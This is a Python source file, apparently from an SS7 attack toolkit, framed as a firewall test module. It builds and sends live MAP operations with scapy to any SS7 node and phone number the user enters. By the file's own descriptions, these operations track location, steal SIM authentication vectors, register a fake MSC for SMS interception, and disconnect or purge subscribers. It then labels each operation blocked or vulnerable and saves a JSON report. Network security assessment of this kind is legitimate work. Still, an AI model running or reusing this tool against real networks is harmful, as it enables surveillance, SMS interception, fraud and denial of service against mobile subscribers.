#!/usr/bin/env python
"""
SS7 Firewall Test Module
Tests which MAP operations are blocked/allowed by the target network.
Sends each MAP operation type and records the response.

This helps identify the security posture of an SS7 network.
"""
import sys
import os
import time
import json
import datetime
from scapy.all import *

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from ss7.attacks.ss7_layers import *
from ss7.attacks.map_layer import (
    SendRoutingInfo, SendRoutingInfoForSM, SendRoutingInfoForGPRS,
    ProvideSubscriberInfo, AnyTimeInterrogation, SendIMSI,
    UpdateLocation, CancelLocation, PurgeMS,
    SendAuthenticationInfo, InsertSubscriberData, MTForwardSM
)


def _prompt_int(prompt, default, min_value=None, max_value=None):
    while True:
        raw_value = get_input(prompt, str(default))
        try:
            value = int(raw_value)
        except ValueError:
            print("[-] Lutfen sayisal bir deger girin.")
            continue
        if min_value is not None and value < min_value:
            print(f"[-] Deger en az {min_value} olmalidir.")
            continue
        if max_value is not None and value > max_value:
            print(f"[-] Deger en fazla {max_value} olmalidir.")
            continue
        return value


def _prompt_msisdn(prompt, default):
    while True:
        raw_value = get_input(prompt, default).strip()
        normalized = raw_value.lstrip('+')
        if normalized.isdigit() and len(normalized) >= 10:
            return normalized
        print("[-] MSISDN sadece rakamlardan olusmali (en az 10 hane).")

# Test definitions: (name, risk_level, description, builder_func)
FIREWALL_TESTS = [
    {
        'name': 'SendRoutingInfo (SRI)',
        'opcode': 22,
        'risk': 'MEDIUM',
        'category': 'Location Tracking',
        'description': 'Query call routing - reveals IMSI and MSC address',
        'build': lambda msisdn: SendRoutingInfo(msisdn),
    },
    {
        'name': 'SendRoutingInfoForSM (SRI-SM)',
        'opcode': 45,
        'risk': 'HIGH',
        'category': 'Location Tracking',
        'description': 'SMS routing query - reveals serving MSC/SGSN',
        'build': lambda msisdn: SendRoutingInfoForSM(msisdn, '00000000'),
    },
    {
        'name': 'AnyTimeInterrogation (ATI)',
        'opcode': 71,
        'risk': 'HIGH',
        'category': 'Location Tracking',
        'description': 'Direct location query - reveals Cell-ID/LAC',
        'build': lambda msisdn: AnyTimeInterrogation(msisdn),
    },
    {
        'name': 'SendIMSI',
        'opcode': 58,
        'risk': 'HIGH',
        'category': 'Information Gathering',
        'description': 'IMSI retrieval from MSISDN',
        'build': lambda msisdn: SendIMSI(msisdn),
    },
    {
        'name': 'SendAuthenticationInfo (SAI)',
        'opcode': 56,
        'risk': 'CRITICAL',
        'category': 'Authentication',
        'description': 'Steals auth vectors (RAND/SRES/Kc) for SIM cloning',
        'build': lambda msisdn: SendAuthenticationInfo(msisdn.replace('+', ''), 5),
    },
    {
        'name': 'UpdateLocation (UL)',
        'opcode': 2,
        'risk': 'CRITICAL',
        'category': 'Interception',
        'description': 'Registers fake MSC - enables SMS interception',
        'build': lambda msisdn: UpdateLocation(msisdn.replace('+', ''), msisdn, msisdn),
    },
    {
        'name': 'CancelLocation (CL)',
        'opcode': 3,
        'risk': 'HIGH',
        'category': 'Denial of Service',
        'description': 'Disconnects subscriber from network',
        'build': lambda msisdn: CancelLocation(msisdn.replace('+', ''), 0),
    },
    {
        'name': 'PurgeMS',
        'opcode': 67,
        'risk': 'HIGH',
        'category': 'Denial of Service',
        'description': 'Purges subscriber from VLR - DoS attack',
        'build': lambda msisdn: PurgeMS(msisdn.replace('+', ''), msisdn),
    },
    {
        'name': 'InsertSubscriberData (ISD)',
        'opcode': 7,
        'risk': 'HIGH',
        'category': 'Fraud',
        'description': 'Modifies subscriber profile in VLR',
        'build': lambda msisdn: InsertSubscriberData(msisdn.replace('+', ''), msisdn),
    },
]


def firewall_test_menu():
    """SS7 Firewall Test main menu."""
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print("=" * 60)
    print(" SS7 Firewall Test Module")
    print(" Tests which MAP operations are blocked/allowed")
    print("=" * 60)
    print()
    print("[1] Connection Configuration")
    print("-" * 30)
    remote_ip = get_input("Target SS7 Node IP", "10.0.0.1", validator=validate_ip)
    remote_port = _prompt_int("Target Port", 2905, min_value=1, max_value=65535)
    
    print("\n[2] SS7 Configuration")
    print("-" * 30)
    opc = _prompt_int("Your Point Code (OPC)", 1, min_value=0, max_value=16383)
    dpc = _prompt_int("Target Point Code (DPC)", 2, min_value=0, max_value=16383)
    test_msisdn = _prompt_msisdn("Test MSISDN (any number)", "905551234567")
    
    print("\n" + "=" * 60)
    print(" Running Firewall Tests ({} operations)".format(len(FIREWALL_TESTS)))
    print("=" * 60 + "\n")
    
    # First test SCTP connectivity
    print("[*] Phase 1: Testing SCTP connectivity...")
    try:
        init_pkt = IP(dst=remote_ip) / SCTP(sport=2905, dport=remote_port) / SCTPChunkInit()
        ans = sr1(init_pkt, timeout=5, verbose=0)
        
        if ans is None:
            print("[-] No SCTP response. Target unreachable.")
            input("\nPress Enter to return...")
            return
        elif ans.haslayer(SCTPChunkInitAck):
            print("[+] SCTP INIT-ACK received! Node is reachable.")
        elif ans.haslayer(SCTPChunkAbort):
            print("[-] SCTP ABORT. Port is closed.")
            input("\nPress Enter to return...")
            return
        else:
            print("[-] Unexpected response.")
            input("\nPress Enter to return...")
            return
    except Exception as e:
        print(f"[-] SCTP Error: {e}")
        input("\nPress Enter to return...")
        return
    
    # Phase 2: Test each MAP operation
    print("\n[*] Phase 2: Testing MAP operations...\n")
    
    results = []
    
    for test in FIREWALL_TESTS:
        print(f"  [{test['risk']:>8}] {test['name']:<40}", end="", flush=True)
        
        try:
            map_msg = test['build'](test_msisdn)
            tcap_data = map_msg.to_tcap_begin()
            
            m3ua = M3UA(msg_class=1, msg_type=1)
            proto_data = M3UA_Param_Protocol_Data(opc=opc, dpc=dpc, si=3, ni=2)
            
            data_pkt = IP(dst=remote_ip) / SCTP(sport=2905, dport=remote_port) / \
                       SCTPChunkData(data=bytes(m3ua/proto_data) + tcap_data)
            
            map_ans = sr1(data_pkt, timeout=3, verbose=0)
            
            if map_ans is None:
                status = "TIMEOUT"
                verdict = "UNKNOWN"
                color = "\033[33m"
            elif map_ans.haslayer(Raw):
                raw_data = map_ans[Raw].load
                # Check for TCAP error/reject
                if len(raw_data) > 0 and raw_data[0] == 0x67:  # TCAP Abort
                    status = "BLOCKED"
                    verdict = "PROTECTED"
                    color = "\033[32m"
                elif len(raw_data) > 0 and raw_data[0] == 0x64:  # TCAP End
                    status = "ALLOWED"
                    verdict = "VULNERABLE"
                    color = "\033[31m"
                elif len(raw_data) > 0 and raw_data[0] == 0x65:  # TCAP Continue
                    status = "ALLOWED"
                    verdict = "VULNERABLE"
                    color = "\033[31m"
                else:
                    status = "RESPONSE"
                    verdict = "CHECK"
                    color = "\033[33m"
            else:
                status = "RESPONSE"
                verdict = "CHECK"
                color = "\033[33m"
            
            print(f" {color}[{verdict}]\033[0m {status}")
            
            results.append({
                'test': test['name'],
                'opcode': test['opcode'],
                'risk': test['risk'],
                'category': test['category'],
                'description': test['description'],
                'status': status,
                'verdict': verdict,
            })
            
        except Exception as e:
            print(f" \033[33m[ERROR]\033[0m {e}")
            results.append({
                'test': test['name'],
                'opcode': test['opcode'],
                'risk': test['risk'],
                'category': test['category'],
                'description': test['description'],
                'status': 'ERROR',
                'verdict': str(e),
            })
    
    # Summary
    blocked = sum(1 for r in results if r['verdict'] == 'PROTECTED')
    allowed = sum(1 for r in results if r['verdict'] == 'VULNERABLE')
    unknown = sum(1 for r in results if r['verdict'] not in ('PROTECTED', 'VULNERABLE'))
    
    print("\n" + "=" * 60)
    print(" FIREWALL TEST RESULTS")
    print("=" * 60)
    print(f"  Target:     {remote_ip}:{remote_port}")
    print(f"  Protected:  \033[32m{blocked}\033[0m / {len(results)}")
    print(f"  Vulnerable: \033[31m{allowed}\033[0m / {len(results)}")
    print(f"  Unknown:    \033[33m{unknown}\033[0m / {len(results)}")
    
    if allowed == 0 and blocked > 0:
        print(f"\n  \033[32m[+] Network appears well-protected against SS7 attacks\033[0m")
    elif allowed > 0:
        print(f"\n  \033[31m[!] Network has {allowed} vulnerable MAP operations!\033[0m")
    
    # Save results
    report_file = f"firewall_test_{remote_ip.replace('.','_')}.json"
    report = {
        'target': f"{remote_ip}:{remote_port}",
        'date': datetime.datetime.now().isoformat(),
        'opc': opc,
        'dpc': dpc,
        'summary': {
            'total': len(results),
            'protected': blocked,
            'vulnerable': allowed,
            'unknown': unknown,
        },
        'results': results,
    }
    
    with open(report_file, 'w') as f:
        json.dump(report, f, indent=2)
    print(f"\n  Report saved: {os.path.abspath(report_file)}")
    print("=" * 60)
    
    input("\nPress Enter to return...")


if __name__ == "__main__":
    firewall_test_menu()
